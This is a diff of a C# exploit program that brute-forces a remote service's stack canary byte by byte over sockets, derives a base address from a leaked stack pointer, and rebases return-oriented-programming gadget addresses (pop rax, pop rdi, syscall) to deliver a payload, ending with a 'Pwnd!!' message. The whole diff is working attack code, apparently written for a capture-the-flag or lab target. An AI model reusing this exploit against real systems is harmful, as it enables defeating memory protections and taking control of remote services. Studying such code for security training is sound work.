@@ -7,15 +7,36 @@ using System.Net.Sockets;
 namespace dSocket
 {
     public class Rop
-    {
-        public const int RAX = 0x0000000000000b51; // pop rax; ret
-        public const int RBP = 0x0000000000000a90; // pop rbp; ret
-        public const int RDI = 0x0000000000000f73; // pop rdi; ret
-        public const int RDX = 0x0000000000000b53; // pop rdx; ret
-        public const int RSIplus = 0x0000000000000f71; // pop rsi; pop r15; ret
-        public const int RSPplus = 0x0000000000000f6d; // pop rsp; pop r13; pop r14; pop r15; ret
-        public const int LeaveR = 0x0000000000000b6d; // leave ; ret
-        public const int Syscall = 0x0000000000000b55; // syscall ; ret
+    {        
+        public const int RAXb = 0x0000000000000b51; // pop rax; ret
+        public const int RBPb = 0x0000000000000a90; // pop rbp; ret
+        public const int RDIb = 0x0000000000000f73; // pop rdi; ret
+        public const int RDXb = 0x0000000000000b53; // pop rdx; ret
+        public const int RSIplusb = 0x0000000000000f71; // pop rsi; pop r15; ret
+        public const int RSPplusb = 0x0000000000000f6d; // pop rsp; pop r13; pop r14; pop r15; ret
+        public const int LeaveRb = 0x0000000000000b6d; // leave ; ret
+        public const int Syscallb = 0x0000000000000b55; // syscall ; ret
+
+        public UInt64 RAX;
+        public UInt64 RBP;
+        public UInt64 RDI;
+        public UInt64 RDX;
+        public UInt64 RSIplus;
+        public UInt64 RSPplus;
+        public UInt64 LeaveR;
+        public UInt64 Syscall;
+
+        public Rop(UInt64 offSet)
+        {
+            RAX     = offSet + Convert.ToUInt64(RAXb);
+            RBP     = offSet + Convert.ToUInt64(RBPb);
+            RDI     = offSet + Convert.ToUInt64(RDIb);
+            RDX     = offSet + Convert.ToUInt64(RDXb);
+            RSIplus = offSet + Convert.ToUInt64(RSIplusb);
+            RSPplus = offSet + Convert.ToUInt64(RSPplusb);
+            LeaveR  = offSet + Convert.ToUInt64(LeaveRb);
+            Syscall = offSet + Convert.ToUInt64(Syscallb);
+        }
     }
     class Program
     {
@@ -78,7 +99,15 @@ namespace dSocket
                     // test new byte
                     Socket testSocket = ConnectSocket();
                     testSocket.ReceiveTimeout = 1000;
-                    int bytesRec = testSocket.Receive(bytes);
+                    int bytesRec = 0;
+                    try
+                    {
+                        bytesRec = testSocket.Receive(bytes);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[!] Skipping dead byte..");
+                    }
                     testSocket.Send(returnBuffer);
                     bytesRec = 0;
                     Array.Clear(bytes, 0, bytes.Length);
@@ -147,8 +176,10 @@ namespace dSocket
             
             UInt64 thing = (UInt64)new System.ComponentModel.UInt64Converter().ConvertFromString(RSPStr);
             UInt64 toSub = (UInt64)new System.ComponentModel.UInt64Converter().ConvertFromString("0xe5f");
-            Console.WriteLine("{0} - {1} = {2}", thing, toSub, thing-toSub);
-            Console.WriteLine("{0} = {1}", thing - toSub, string.Format("0x{0:X}", thing - toSub));
+            UInt64 realOffset = thing - toSub;
+            Rop myRop = new Rop(realOffset);
+
+            Console.WriteLine("[!] ROP chain: pop RAX ; ret = {0}", string.Format("0x{0:x}", myRop.RAX));
 
             return inputBuffer;
         }
@@ -168,19 +199,7 @@ namespace dSocket
             toReturn = GetCanaryAndOffset(toReturn);
 
             return toReturn;
-        }
-        private static void _end(Socket mySocket)
-        {
-            byte[] bytes = new byte[1024];
-            int bytesRec2 = mySocket.Receive(bytes);
-            mySocket.Close();
-            if (bytesRec2 > 0)
-            {
-                Console.Write(" - payload + canary + offset VERIFIED!!\n");
-            }
-            Console.WriteLine("[+] Pwnd!!  Hit ENTER to exit.");
-            Console.ReadKey();
-        }
+        }        
         private static void _pwn()
         {
             Console.WriteLine("[~] Let's rage!!\n[*] Beginning brute force");
@@ -191,23 +210,33 @@ namespace dSocket
             byte[] myPayload = GetPayload();
             if (myPayload.Length > 0)
             {
-                Console.WriteLine("[+] Payload generated");
+                Console.WriteLine("[+] Payload generated. Length: {0}", myPayload.Length);
             }
 
             // connect
+            Console.WriteLine("\n\ntime for debugger stuff");
+            Console.ReadKey();
             Socket mySocket = ConnectSocket();
             int bytesRec3 = mySocket.Receive(bytes);
             if (bytesRec3 > 0)
             {
-                Console.WriteLine("[+] Connected");
+                Console.WriteLine("[+] Connected - {0}", Encoding.ASCII.GetString(bytes, 0, bytesRec3));
             }
 
             // send it
             mySocket.Send(myPayload);
             Console.Write("[+] Payload sent");
 
-            // profit
-            _end(mySocket);
+            // profit            
+            Array.Clear(bytes, 0, bytes.Length);
+            int bytesRec2 = mySocket.Receive(bytes);
+            mySocket.Close();
+            if (bytesRec2 > 0)
+            {
+                Console.Write(" {0} - payload + canary + offset VERIFIED!!\n", Encoding.ASCII.GetString(bytes, 0, bytesRec2));
+            }
+            Console.WriteLine("[+] Pwnd!!  Hit ENTER to exit.");
+            Console.ReadKey();
         }
 
         private static void Main(string[] args)
